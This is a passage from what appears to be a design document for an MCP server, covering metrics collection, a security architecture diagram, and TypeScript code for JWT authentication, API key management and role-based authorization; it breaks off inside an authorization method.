      name: `${this.config.prefix}tool_execution_duration_seconds`,
      help: 'Tool execution duration in seconds',
      labelNames: ['tool_name', 'status'],
      buckets: this.config.buckets.latency,
      registers: [this.registry]
    });
    
    // Token usage histogram
    this.tokenUsage = new Histogram({
      name: `${this.config.prefix}tokens_per_request`,
      help: 'Tokens used per request',
      labelNames: ['type'],
      buckets: this.config.buckets.tokens,
      registers: [this.registry]
    });
    
    // Active sessions gauge
    this.activeSessions = new Gauge({
      name: `${this.config.prefix}active_sessions`,
      help: 'Number of active MCP sessions',
      labelNames: ['tenant_id'],
      registers: [this.registry]
    });
    
    // Cache size gauge
    this.cacheSize = new Gauge({
      name: `${this.config.prefix}cache_size_bytes`,
      help: 'Cache size in bytes',
      labelNames: ['cache_type'],
      registers: [this.registry]
    });
    
    // Queue depth gauge
    this.queueDepth = new Gauge({
      name: `${this.config.prefix}queue_depth`,
      help: 'Number of jobs in queue',
      labelNames: ['queue_name'],
      registers: [this.registry]
    });
    
    // Circuit breaker status
    this.circuitBreakerStatus = new Gauge({
      name: `${this.config.prefix}circuit_breaker_open`,
      help: 'Circuit breaker status (1 = open, 0 = closed)',
      labelNames: ['integration'],
      registers: [this.registry]
    });
  }
  
  // Recording methods
  
  recordRequest(method: string, status: string, tenantId: string): void {
    this.requestCounter.inc({ method, status, tenant_id: tenantId });
  }
  
  recordError(type: string, method: string, tenantId: string): void {
    this.errorCounter.inc({ type, method, tenant_id: tenantId });
  }
  
  recordCacheHit(cacheType: string, namespace: string): void {
    this.cacheHitCounter.inc({ cache_type: cacheType, namespace });
  }
  
  recordCacheMiss(cacheType: string, namespace: string): void {
    this.cacheMissCounter.inc({ cache_type: cacheType, namespace });
  }
  
  recordTokenUsage(type: string, tenantId: string, count: number): void {
    this.tokenCounter.inc({ type, tenant_id: tenantId }, count);
    this.tokenUsage.observe({ type }, count);
  }
  
  recordRequestLatency(method: string, status: string, durationSeconds: number): void {
    this.requestLatency.observe({ method, status }, durationSeconds);
  }
  
  recordResourceLoadLatency(resourceType: string, cached: boolean, durationSeconds: number): void {
    this.resourceLoadLatency.observe({
      resource_type: resourceType,
      cached: cached.toString()
    }, durationSeconds);
  }
  
  recordToolExecutionLatency(toolName: string, status: string, durationSeconds: number): void {
    this.toolExecutionLatency.observe({ tool_name: toolName, status }, durationSeconds);
  }
  
  setActiveSessions(tenantId: string, count: number): void {
    this.activeSessions.set({ tenant_id: tenantId }, count);
  }
  
  setCacheSize(cacheType: string, bytes: number): void {
    this.cacheSize.set({ cache_type: cacheType }, bytes);
  }
  
  setQueueDepth(queueName: string, depth: number): void {
    this.queueDepth.set({ queue_name: queueName }, depth);
  }
  
  setCircuitBreakerStatus(integration: string, isOpen: boolean): void {
    this.circuitBreakerStatus.set({ integration }, isOpen ? 1 : 0);
  }
  
  // Utility methods
  
  /**
   * Get metrics in Prometheus format
   */
  async getMetrics(): Promise<string> {
    return this.registry.metrics();
  }
  
  /**
   * Get metrics as JSON
   */
  async getMetricsJSON(): Promise<object> {
    return this.registry.getMetricsAsJSON();
  }
  
  /**
   * Reset all metrics
   */
  resetMetrics(): void {
    this.registry.resetMetrics();
  }
  
  /**
   * Create timing helper
   */
  startTimer(): () => number {
    const start = process.hrtime.bigint();
    return () => {
      const end = process.hrtime.bigint();
      return Number(end - start) / 1e9; // Convert to seconds
    };
  }
}

// Export singleton
export const mcpMetrics = new MCPMetricsCollector({
  logger: require('pino')()
});
```

---

## 8. Security & Permissions

### 8.1 Security Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           MCP SECURITY ARCHITECTURE                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │                         PERIMETER SECURITY                               │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐  │    │
│  │  │ TLS 1.3      │  │ Rate Limit   │  │ WAF Rules    │  │ DDoS        │  │    │
│  │  │ Termination  │  │ Enforcement  │  │ Enforcement  │  │ Protection  │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────┘  └─────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                        │                                         │
│                                        ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │                       AUTHENTICATION LAYER                               │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐  │    │
│  │  │ JWT Token    │  │ API Key      │  │ Session      │  │ mTLS        │  │    │
│  │  │ Validation   │  │ Validation   │  │ Validation   │  │ Validation  │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────┘  └─────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                        │                                         │
│                                        ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │                       AUTHORIZATION LAYER                                │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐  │    │
│  │  │ RBAC        │  │ ABAC        │  │ Resource     │  │ Tool        │  │    │
│  │  │ Engine      │  │ Engine      │  │ Permissions  │  │ Permissions │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────┘  └─────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                        │                                         │
│                                        ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │                       TENANT ISOLATION LAYER                             │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐  │    │
│  │  │ Data        │  │ Resource     │  │ Context      │  │ Audit       │  │    │
│  │  │ Isolation   │  │ Isolation    │  │ Isolation    │  │ Separation  │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────┘  └─────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                        │                                         │
│                                        ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │                       DATA PROTECTION LAYER                              │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐  │    │
│  │  │ Encryption   │  │ PII         │  │ Data         │  │ Secure      │  │    │
│  │  │ at Rest     │  │ Masking     │  │ Anonymization│  │ Deletion    │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────┘  └─────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 8.2 Authentication System

#### 8.2.1 JWT Token Authentication

```typescript
// src/mcp/security/authentication.ts

import { verify, sign, decode, JwtPayload } from 'jsonwebtoken';
import { createHash, randomBytes, timingSafeEqual } from 'crypto';
import { Redis } from 'ioredis';
import { Logger } from 'pino';

/**
 * JWT Token Configuration
 */
interface JWTConfig {
  secret: string;
  publicKey?: string;
  privateKey?: string;
  algorithm: 'HS256' | 'HS384' | 'HS512' | 'RS256' | 'RS384' | 'RS512' | 'ES256' | 'ES384' | 'ES512';
  issuer: string;
  audience: string;
  accessTokenTtl: number; // seconds
  refreshTokenTtl: number; // seconds
  clockTolerance: number; // seconds
}

/**
 * Token Payload
 */
interface TokenPayload extends JwtPayload {
  sub: string; // User/Service ID
  tenantId: string;
  sessionId: string;
  roles: string[];
  permissions: string[];
  scope: string[];
  type: 'access' | 'refresh' | 'service';
  metadata?: Record<string, any>;
}

/**
 * Authentication Result
 */
interface AuthResult {
  authenticated: boolean;
  principal?: {
    id: string;
    tenantId: string;
    sessionId: string;
    roles: string[];
    permissions: string[];
    type: 'user' | 'service' | 'system';
  };
  token?: {
    jti: string;
    exp: number;
    iat: number;
  };
  error?: string;
}

/**
 * Token Pair
 */
interface TokenPair {
  accessToken: string;
  refreshToken: string;
  accessTokenExpiresAt: Date;
  refreshTokenExpiresAt: Date;
}

/**
 * Authentication Service
 * Handles JWT token validation and management
 */
export class AuthenticationService {
  private readonly config: JWTConfig;
  private readonly redis: Redis;
  private readonly logger: Logger;
  private readonly tokenBlacklist: Set<string> = new Set();
  private readonly maxBlacklistSize = 10000;
  
  constructor(config: JWTConfig, redis: Redis, logger: Logger) {
    this.config = config;
    this.redis = redis;
    this.logger = logger;
    
    this.loadBlacklistFromRedis();
  }
  
  /**
   * Generate token pair (access + refresh)
   */
  async generateTokenPair(
    userId: string,
    tenantId: string,
    sessionId: string,
    roles: string[],
    permissions: string[],
    scope: string[] = ['mcp:full'],
    type: 'user' | 'service' = 'user'
  ): Promise<TokenPair> {
    const now = Math.floor(Date.now() / 1000);
    const jti = this.generateJti();
    
    // Access token payload
    const accessPayload: TokenPayload = {
      sub: userId,
      tenantId,
      sessionId,
      roles,
      permissions,
      scope,
      type: 'access',
      iat: now,
      exp: now + this.config.accessTokenTtl,
      iss: this.config.issuer,
      aud: this.config.audience,
      jti
    };
    
    // Refresh token payload
    const refreshJti = this.generateJti();
    const refreshPayload: TokenPayload = {
      sub: userId,
      tenantId,
      sessionId,
      roles: [], // Minimal roles for refresh
      permissions: ['token:refresh'],
      scope: ['token:refresh'],
      type: 'refresh',
      iat: now,
      exp: now + this.config.refreshTokenTtl,
      iss: this.config.issuer,
      aud: this.config.audience,
      jti: refreshJti,
      metadata: { accessJti: jti }
    };
    
    // Sign tokens
    const accessToken = this.signToken(accessPayload);
    const refreshToken = this.signToken(refreshPayload);
    
    // Store refresh token reference
    await this.storeRefreshToken(refreshJti, userId, tenantId, sessionId);
    
    return {
      accessToken,
      refreshToken,
      accessTokenExpiresAt: new Date((now + this.config.accessTokenTtl) * 1000),
      refreshTokenExpiresAt: new Date((now + this.config.refreshTokenTtl) * 1000)
    };
  }
  
  /**
   * Verify and decode token
   */
  async verifyToken(token: string): Promise<AuthResult> {
    try {
      // Check if token is blacklisted
      const decoded = decode(token, { complete: true });
      if (!decoded || typeof decoded.payload === 'string') {
        return { authenticated: false, error: 'Invalid token format' };
      }
      
      const payload = decoded.payload as TokenPayload;
      
      // Check blacklist (in-memory first, then Redis)
      if (this.tokenBlacklist.has(payload.jti!)) {
        return { authenticated: false, error: 'Token revoked' };
      }
      
      const isBlacklisted = await this.redis.sismember(
        'auth:token:blacklist',
        payload.jti!
      );
      if (isBlacklisted) {
        this.tokenBlacklist.add(payload.jti!);
        return { authenticated: false, error: 'Token revoked' };
      }
      
      // Verify token signature
      const verified = verify(token, this.getVerificationKey(), {
        algorithms: [this.config.algorithm],
        issuer: this.config.issuer,
        audience: this.config.audience,
        clockTolerance: this.config.clockTolerance
      }) as TokenPayload;
      
      // Additional validation for refresh tokens
      if (verified.type === 'refresh') {
        const isValid = await this.validateRefreshToken(verified.jti!);
        if (!isValid) {
          return { authenticated: false, error: 'Refresh token invalid or expired' };
        }
      }
      
      return {
        authenticated: true,
        principal: {
          id: verified.sub,
          tenantId: verified.tenantId,
          sessionId: verified.sessionId,
          roles: verified.roles,
          permissions: verified.permissions,
          type: verified.type === 'service' ? 'service' : 'user'
        },
        token: {
          jti: verified.jti!,
          exp: verified.exp!,
          iat: verified.iat!
        }
      };
    } catch (error) {
      this.logger.warn({ error }, 'Token verification failed');
      
      if (error instanceof Error) {
        if (error.name === 'TokenExpiredError') {
          return { authenticated: false, error: 'Token expired' };
        }
        if (error.name === 'JsonWebTokenError') {
          return { authenticated: false, error: 'Invalid token' };
        }
      }
      
      return { authenticated: false, error: 'Token verification failed' };
    }
  }
  
  /**
   * Refresh access token using refresh token
   */
  async refreshAccessToken(refreshToken: string): Promise<TokenPair | null> {
    const result = await this.verifyToken(refreshToken);
    
    if (!result.authenticated || result.principal?.type === 'service') {
      this.logger.warn('Invalid refresh token attempt');
      return null;
    }
    
    // Get stored refresh token data
    const storedData = await this.getRefreshTokenData(result.token!.jti);
    if (!storedData) {
      return null;
    }
    
    // Revoke old refresh token
    await this.revokeToken(result.token!.jti);
    
    // Load user permissions (might have changed)
    const permissions = await this.loadUserPermissions(
      result.principal!.id,
      result.principal!.tenantId
    );
    
    // Generate new token pair
    return this.generateTokenPair(
      result.principal!.id,
      result.principal!.tenantId,
      result.principal!.sessionId,
      storedData.roles,
      permissions,
      storedData.scope
    );
  }
  
  /**
   * Revoke token
   */
  async revokeToken(jti: string): Promise<void> {
    // Add to Redis blacklist with expiry
    await this.redis.sadd('auth:token:blacklist', jti);
    await this.redis.expire('auth:token:blacklist', this.config.refreshTokenTtl);
    
    // Add to local cache
    this.tokenBlacklist.add(jti);
    
    // Cleanup if cache too large
    if (this.tokenBlacklist.size > this.maxBlacklistSize) {
      const entries = Array.from(this.tokenBlacklist);
      entries.slice(0, this.maxBlacklistSize / 2).forEach(e => {
        this.tokenBlacklist.delete(e);
      });
    }
    
    // Remove refresh token data
    await this.redis.del(`auth:refresh:${jti}`);
    
    this.logger.info({ jti }, 'Token revoked');
  }
  
  /**
   * Revoke all tokens for session
   */
  async revokeSession(sessionId: string): Promise<number> {
    const pattern = `auth:session:${sessionId}:*`;
    const keys = await this.redis.keys(pattern);
    
    let revoked = 0;
    for (const key of keys) {
      const jti = await this.redis.get(key);
      if (jti) {
        await this.revokeToken(jti);
        revoked++;
      }
    }
    
    // Delete session keys
    if (keys.length > 0) {
      await this.redis.del(...keys);
    }
    
    this.logger.info({ sessionId, revoked }, 'Session tokens revoked');
    return revoked;
  }
  
  /**
   * Revoke all tokens for user
   */
  async revokeAllUserTokens(userId: string, tenantId: string): Promise<number> {
    const pattern = `auth:user:${tenantId}:${userId}:*`;
    const keys = await this.redis.keys(pattern);
    
    let revoked = 0;
    for (const key of keys) {
      const jti = await this.redis.get(key);
      if (jti) {
        await this.revokeToken(jti);
        revoked++;
      }
    }
    
    if (keys.length > 0) {
      await this.redis.del(...keys);
    }
    
    this.logger.info({ userId, tenantId, revoked }, 'All user tokens revoked');
    return revoked;
  }
  
  // Private methods
  
  private signToken(payload: TokenPayload): string {
    const key = this.config.privateKey || this.config.secret;
    return sign(payload, key, { algorithm: this.config.algorithm });
  }
  
  private getVerificationKey(): string {
    return this.config.publicKey || this.config.secret;
  }
  
  private generateJti(): string {
    return randomBytes(16).toString('hex');
  }
  
  private async storeRefreshToken(
    jti: string,
    userId: string,
    tenantId: string,
    sessionId: string
  ): Promise<void> {
    const data = JSON.stringify({
      userId,
      tenantId,
      sessionId,
      createdAt: Date.now()
    });
    
    await this.redis.setex(
      `auth:refresh:${jti}`,
      this.config.refreshTokenTtl,
      data
    );
    
    // Index for session lookup
    await this.redis.setex(
      `auth:session:${sessionId}:${jti}`,
      this.config.refreshTokenTtl,
      jti
    );
    
    // Index for user lookup
    await this.redis.setex(
      `auth:user:${tenantId}:${userId}:${jti}`,
      this.config.refreshTokenTtl,
      jti
    );
  }
  
  private async validateRefreshToken(jti: string): Promise<boolean> {
    const exists = await this.redis.exists(`auth:refresh:${jti}`);
    return exists === 1;
  }
  
  private async getRefreshTokenData(jti: string): Promise<any> {
    const data = await this.redis.get(`auth:refresh:${jti}`);
    return data ? JSON.parse(data) : null;
  }
  
  private async loadUserPermissions(userId: string, tenantId: string): Promise<string[]> {
    // Load from database/cache
    const cached = await this.redis.smembers(`auth:permissions:${tenantId}:${userId}`);
    if (cached.length > 0) {
      return cached;
    }
    
    // Default permissions
    return ['mcp:read', 'mcp:write'];
  }
  
  private async loadBlacklistFromRedis(): Promise<void> {
    const members = await this.redis.smembers('auth:token:blacklist');
    members.slice(0, this.maxBlacklistSize).forEach(m => {
      this.tokenBlacklist.add(m);
    });
  }
}
```

#### 8.2.2 API Key Authentication

```typescript
// src/mcp/security/api-key-auth.ts

import { createHash, randomBytes, timingSafeEqual } from 'crypto';
import { Redis } from 'ioredis';
import { Logger } from 'pino';

/**
 * API Key Configuration
 */
interface APIKeyConfig {
  prefix: string; // e.g., 'mcp_'
  keyLength: number; // bytes
  hashAlgorithm: 'sha256' | 'sha384' | 'sha512';
  maxKeysPerTenant: number;
  defaultRateLimit: number; // requests per minute
}

/**
 * API Key Details
 */
interface APIKey {
  id: string;
  name: string;
  keyHash: string;
  prefix: string; // First 8 chars for identification
  tenantId: string;
  createdBy: string;
  createdAt: Date;
  lastUsedAt?: Date;
  expiresAt?: Date;
  permissions: string[];
  scopes: string[];
  rateLimit: number;
  allowedIps?: string[];
  metadata?: Record<string, any>;
  isActive: boolean;
}

/**
 * API Key Validation Result
 */
interface APIKeyValidationResult {
  valid: boolean;
  apiKey?: APIKey;
  error?: string;
}

/**
 * API Key Manager
 * Handles API key generation, validation, and management
 */
export class APIKeyManager {
  private readonly config: APIKeyConfig;
  private readonly redis: Redis;
  private readonly logger: Logger;
  
  // Local cache for frequent lookups
  private readonly keyCache: Map<string, { key: APIKey; expiresAt: number }> = new Map();
  private readonly cacheTtl = 60000; // 1 minute
  
  constructor(config: APIKeyConfig, redis: Redis, logger: Logger) {
    this.config = config;
    this.redis = redis;
    this.logger = logger;
    
    // Cleanup expired cache entries
    setInterval(() => this.cleanupCache(), this.cacheTtl);
  }
  
  /**
   * Generate new API key
   */
  async generateKey(
    tenantId: string,
    createdBy: string,
    options: {
      name: string;
      permissions?: string[];
      scopes?: string[];
      rateLimit?: number;
      allowedIps?: string[];
      expiresAt?: Date;
      metadata?: Record<string, any>;
    }
  ): Promise<{ apiKey: APIKey; rawKey: string }> {
    // Check key limit
    const existingCount = await this.countTenantKeys(tenantId);
    if (existingCount >= this.config.maxKeysPerTenant) {
      throw new Error(`Maximum API keys (${this.config.maxKeysPerTenant}) reached for tenant`);
    }
    
    // Generate raw key
    const rawKey = this.generateRawKey();
    const keyHash = this.hashKey(rawKey);
    const keyPrefix = rawKey.substring(0, this.config.prefix.length + 8);
    
    const apiKey: APIKey = {
      id: randomBytes(16).toString('hex'),
      name: options.name,
      keyHash,
      prefix: keyPrefix,
      tenantId,
      createdBy,
      createdAt: new Date(),
      expiresAt: options.expiresAt,
      permissions: options.permissions || ['mcp:read'],
      scopes: options.scopes || ['api'],
      rateLimit: options.rateLimit || this.config.defaultRateLimit,
      allowedIps: options.allowedIps,
      metadata: options.metadata,
      isActive: true
    };
    
    // Store in Redis
    await this.storeKey(apiKey);
    
    this.logger.info({
      keyId: apiKey.id,
      tenantId,
      name: options.name
    }, 'API key generated');
    
    return { apiKey, rawKey };
  }
  
  /**
   * Validate API key
   */
  async validateKey(rawKey: string, ip?: string): Promise<APIKeyValidationResult> {
    // Check format
    if (!rawKey.startsWith(this.config.prefix)) {
      return { valid: false, error: 'Invalid key format' };
    }
    
    const keyHash = this.hashKey(rawKey);
    const keyPrefix = rawKey.substring(0, this.config.prefix.length + 8);
    
    // Check cache first
    const cached = this.keyCache.get(keyHash);
    if (cached && cached.expiresAt > Date.now()) {
      return this.performValidation(cached.key, ip);
    }
    
    // Look up by hash
    const keyId = await this.redis.get(`apikey:hash:${keyHash}`);
    if (!keyId) {
      return { valid: false, error: 'Invalid API key' };
    }
    
    // Load full key data
    const keyData = await this.redis.get(`apikey:data:${keyId}`);
    if (!keyData) {
      return { valid: false, error: 'API key data not found' };
    }
    
    const apiKey: APIKey = JSON.parse(keyData);
    
    // Cache for future lookups
    this.keyCache.set(keyHash, {
      key: apiKey,
      expiresAt: Date.now() + this.cacheTtl
    });
    
    return this.performValidation(apiKey, ip);
  }
  
  /**
   * Revoke API key
   */
  async revokeKey(keyId: string, tenantId: string): Promise<boolean> {
    const keyData = await this.redis.get(`apikey:data:${keyId}`);
    if (!keyData) {
      return false;
    }
    
    const apiKey: APIKey = JSON.parse(keyData);
    
    // Verify tenant ownership
    if (apiKey.tenantId !== tenantId) {
      this.logger.warn({ keyId, tenantId }, 'Unauthorized key revocation attempt');
      return false;
    }
    
    // Mark as inactive
    apiKey.isActive = false;
    await this.redis.set(`apikey:data:${keyId}`, JSON.stringify(apiKey));
    
    // Remove from hash lookup
    await this.redis.del(`apikey:hash:${apiKey.keyHash}`);
    
    // Remove from tenant index
    await this.redis.srem(`apikey:tenant:${tenantId}`, keyId);
    
    // Clear cache
    for (const [hash, cached] of this.keyCache.entries()) {
      if (cached.key.id === keyId) {
        this.keyCache.delete(hash);
        break;
      }
    }
    
    this.logger.info({ keyId, tenantId }, 'API key revoked');
    return true;
  }
  
  /**
   * Rotate API key (generate new, revoke old)
   */
  async rotateKey(keyId: string, tenantId: string): Promise<{ apiKey: APIKey; rawKey: string } | null> {
    const keyData = await this.redis.get(`apikey:data:${keyId}`);
    if (!keyData) {
      return null;
    }
    
    const oldKey: APIKey = JSON.parse(keyData);
    
    // Verify tenant ownership
    if (oldKey.tenantId !== tenantId) {
      return null;
    }
    
    // Generate new key with same config
    const result = await this.generateKey(tenantId, oldKey.createdBy, {
      name: `${oldKey.name} (rotated)`,
      permissions: oldKey.permissions,
      scopes: oldKey.scopes,
      rateLimit: oldKey.rateLimit,
      allowedIps: oldKey.allowedIps,
      metadata: {
        ...oldKey.metadata,
        rotatedFrom: keyId,
        rotatedAt: new Date().toISOString()
      }
    });
    
    // Revoke old key
    await this.revokeKey(keyId, tenantId);
    
    this.logger.info({
      oldKeyId: keyId,
      newKeyId: result.apiKey.id,
      tenantId
    }, 'API key rotated');
    
    return result;
  }
  
  /**
   * List tenant API keys
   */
  async listKeys(tenantId: string): Promise<Omit<APIKey, 'keyHash'>[]> {
    const keyIds = await this.redis.smembers(`apikey:tenant:${tenantId}`);
    
    const keys: Omit<APIKey, 'keyHash'>[] = [];
    for (const keyId of keyIds) {
      const keyData = await this.redis.get(`apikey:data:${keyId}`);
      if (keyData) {
        const key: APIKey = JSON.parse(keyData);
        const { keyHash, ...safeKey } = key;
        keys.push(safeKey);
      }
    }
    
    return keys.sort((a, b) => 
      new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
    );
  }
  
  /**
   * Update last used timestamp
   */
  async recordUsage(keyId: string): Promise<void> {
    const keyData = await this.redis.get(`apikey:data:${keyId}`);
    if (keyData) {
      const apiKey: APIKey = JSON.parse(keyData);
      apiKey.lastUsedAt = new Date();
      await this.redis.set(`apikey:data:${keyId}`, JSON.stringify(apiKey));
    }
  }
  
  // Private methods
  
  private generateRawKey(): string {
    const random = randomBytes(this.config.keyLength).toString('base64url');
    return `${this.config.prefix}${random}`;
  }
  
  private hashKey(rawKey: string): string {
    return createHash(this.config.hashAlgorithm)
      .update(rawKey)
      .digest('hex');
  }
  
  private async storeKey(apiKey: APIKey): Promise<void> {
    // Store key data
    await this.redis.set(
      `apikey:data:${apiKey.id}`,
      JSON.stringify(apiKey)
    );
    
    // Create hash -> id mapping
    await this.redis.set(
      `apikey:hash:${apiKey.keyHash}`,
      apiKey.id
    );
    
    // Add to tenant index
    await this.redis.sadd(`apikey:tenant:${apiKey.tenantId}`, apiKey.id);
    
    // Set expiry if defined
    if (apiKey.expiresAt) {
      const ttl = Math.floor((apiKey.expiresAt.getTime() - Date.now()) / 1000);
      if (ttl > 0) {
        await this.redis.expire(`apikey:data:${apiKey.id}`, ttl);
        await this.redis.expire(`apikey:hash:${apiKey.keyHash}`, ttl);
      }
    }
  }
  
  private performValidation(apiKey: APIKey, ip?: string): APIKeyValidationResult {
    // Check if active
    if (!apiKey.isActive) {
      return { valid: false, error: 'API key is revoked' };
    }
    
    // Check expiry
    if (apiKey.expiresAt && new Date(apiKey.expiresAt) < new Date()) {
      return { valid: false, error: 'API key expired' };
    }
    
    // Check IP whitelist
    if (apiKey.allowedIps && apiKey.allowedIps.length > 0 && ip) {
      if (!this.isIpAllowed(ip, apiKey.allowedIps)) {
        return { valid: false, error: 'IP address not allowed' };
      }
    }
    
    return { valid: true, apiKey };
  }
  
  private isIpAllowed(ip: string, allowedIps: string[]): boolean {
    for (const allowed of allowedIps) {
      if (allowed.includes('/')) {
        // CIDR range check
        if (this.isIpInCidr(ip, allowed)) {
          return true;
        }
      } else if (allowed === ip) {
        return true;
      }
    }
    return false;
  }
  
  private isIpInCidr(ip: string, cidr: string): boolean {
    // Simplified CIDR check (IPv4 only)
    const [range, bits] = cidr.split('/');
    const mask = ~(2 ** (32 - parseInt(bits)) - 1);
    
    const ipNum = this.ipToNumber(ip);
    const rangeNum = this.ipToNumber(range);
    
    return (ipNum & mask) === (rangeNum & mask);
  }
  
  private ipToNumber(ip: string): number {
    const parts = ip.split('.').map(Number);
    return (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3];
  }
  
  private async countTenantKeys(tenantId: string): Promise<number> {
    return this.redis.scard(`apikey:tenant:${tenantId}`);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [hash, cached] of this.keyCache.entries()) {
      if (cached.expiresAt <= now) {
        this.keyCache.delete(hash);
      }
    }
  }
}
```

### 8.3 Authorization System

#### 8.3.1 Role-Based Access Control (RBAC)

```typescript
// src/mcp/security/authorization.ts

import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { EventEmitter } from 'events';

/**
 * Permission Types
 */
type Permission = 
  | 'mcp:*'                    // Full MCP access
  | 'mcp:read'                 // Read resources
  | 'mcp:write'                // Write resources
  | 'mcp:admin'                // Administrative access
  | 'tool:*'                   // All tools
  | 'tool:execute'             // Execute any tool
  | `tool:${string}:execute`   // Execute specific tool
  | `tool:${string}:configure` // Configure specific tool
  | 'resource:*'               // All resources
  | 'resource:read'            // Read any resource
  | `resource:${string}:read`  // Read specific resource type
  | `resource:${string}:write` // Write specific resource type
  | 'session:*'                // All session operations
  | 'session:create'           // Create sessions
  | 'session:read'             // Read sessions
  | 'session:manage'           // Manage sessions
  | 'tenant:admin'             // Tenant administration
  | 'user:manage'              // User management
  | 'audit:read';              // Read audit logs

/**
 * Role Definition
 */
interface Role {
  id: string;
  name: string;
  description: string;
  permissions: Permission[];
  inherits?: string[]; // Parent role IDs
  tenantId: string | '*'; // '*' for global roles
  isSystem: boolean;
  metadata?: Record<string, any>;
}

/**
 * Permission Check Result
 */
interface PermissionCheckResult {
  allowed: boolean;
  matchedPermission?: string;
  grantedBy?: string; // Role that granted permission
  reason?: string;
}

/**
 * Authorization Context
 */
interface AuthorizationContext {
  principalId: string;
  tenantId: string;
  roles: string[];
  permissions: Permission[];
  attributes?: Record<string, any>;
}

/**
 * Authorization Service
 * Handles RBAC and permission checks
 */
export class AuthorizationService extends EventEmitter {
  private readonly redis: Redis;
  private readonly logger: Logger;
  
  // Role cache
  private readonly roleCache: Map<string, Role> = new Map();
  private readonly permissionCache: Map<string, Set<Permission>> = new Map();
  private readonly cacheTtl = 300000; // 5 minutes
  private lastCacheRefresh = 0;
  
  // System roles
  private readonly systemRoles: Role[] = [
    {
      id: 'role:system:superadmin',
      name: 'Super Administrator',
      description: 'Full system access',
      permissions: ['mcp:*'],
      tenantId: '*',
      isSystem: true
    },
    {
      id: 'role:system:admin',
      name: 'Tenant Administrator',
      description: 'Full tenant access',
      permissions: [
        'mcp:read', 'mcp:write', 'mcp:admin',
        'tool:*', 'resource:*', 'session:*',
        'tenant:admin', 'user:manage', 'audit:read'
      ],
      tenantId: '*',
      isSystem: true
    },
    {
      id: 'role:system:operator',
      name: 'Operator',
      description: 'Operational access',
      permissions: [
        'mcp:read', 'mcp:write',
        'tool:execute', 'resource:read',
        'session:create', 'session:read'
      ],
      tenantId: '*',
      isSystem: true
    },
    {
      id: 'role:system:viewer',
      name: 'Viewer',
      description: 'Read-only access',
      permissions: [
        'mcp:read', 'resource:read', 'session:read'
      ],
      tenantId: '*',
      isSystem: true
    },
    {
      id: 'role:system:agent',
      name: 'AI Agent',
      description: 'AI agent operational access',
      permissions: [
        'mcp:read', 'mcp:write',
        'tool:execute', 'resource:read', 'resource:write',
        'session:create', 'session:read', 'session:manage'
      ],
      tenantId: '*',
      isSystem: true
    },
    {
      id: 'role:system:service',
      name: 'Service Account',
      description: 'Inter-service communication',
      permissions: [
        'mcp:read', 'mcp:write',
        'tool:execute', 'resource:*', 'session:*'
      ],
      tenantId: '*',
      isSystem: true
    }
  ];
  
  constructor(redis: Redis, logger: Logger) {
    super();
    this.redis = redis;
    this.logger = logger;
    
    // Initialize system roles
    this.initializeSystemRoles();
  }
  
  /**
   * Check if principal has permission
   */
  async checkPermission(
    context: AuthorizationContext,
    requiredPermission: Permission
  ): Promise<PermissionCheckResult> {
    // Super admin bypass
    if (context.permissions.includes('mcp:*')) {
      return {
        allowed: true,
        matchedPermission: 'mcp:*',
        grantedBy: 'direct',
        reason: 'Super admin access'
      };
    }
    
    // Get effective permissions for all roles
    const effectivePermissions = await this.getEffectivePermissions(
      context.tenantId,
      context.roles
    );
    
    // Check direct permission
    if (effectivePermissions.has(requiredPermission)) {
      return {
        allowed: true,
        matchedPermission: requiredPermission,
        grantedBy: 'role',
        reason: 'Direct permission grant'
      };
    }
    
    // Check wildcard permissions
    const wildcardMatch = this.checkWildcardPermission(
      effectivePermissions,
      requiredPermission
    );
    
    if (wildcardMatch) {
      return {
        allowed: true,
        matchedPermission: wildcardMatch,
        grantedBy: 'wildcard',
        reason: 'Wildcard permission match'
      };
    }
    
    // Permission denied
    this.emit('permission:denied', {
      principalId: context.principalId,
      tenantId: context.tenantId,
      requiredPermission,
      timestamp: new Date()
    });
    
    return {
      allowed: false,
      reason: `Missing permission: ${requiredPermission}`
    };
  }
  
  /**
   * Check multiple permissions (all required)
   */
  async checkPermissions(
    context: AuthorizationContext,
    requiredPermissions: Permission[]
  ): Promise<{ allowed: boolean; missingPermissions: Permission[] }> {
    const missingPermissions: Permission[] = [];
    
    for (const permission of requiredPermissions) {
      const result = await this.checkPermission(context, permission);
      if (!result.allowed) {
        missingPermissions.push(permission);
      }
    }
    
    return {
      allowed: missingPermissions.length === 0,
      missingPermissions
    };
  }
  
  /**
   * Check any permission (at least one required)
   */
  async checkAnyPermission(
    context: AuthorizationContext,
    requiredPermissions: Permission[]
  ): Promise<PermissionCheckResult> {
    for (const permission of requiredPermissions) {
      const result = await this.checkPermission(context, permission);
      if (result.allowed) {
        return result;
      }
    }
    
    return {
      allowed: false,
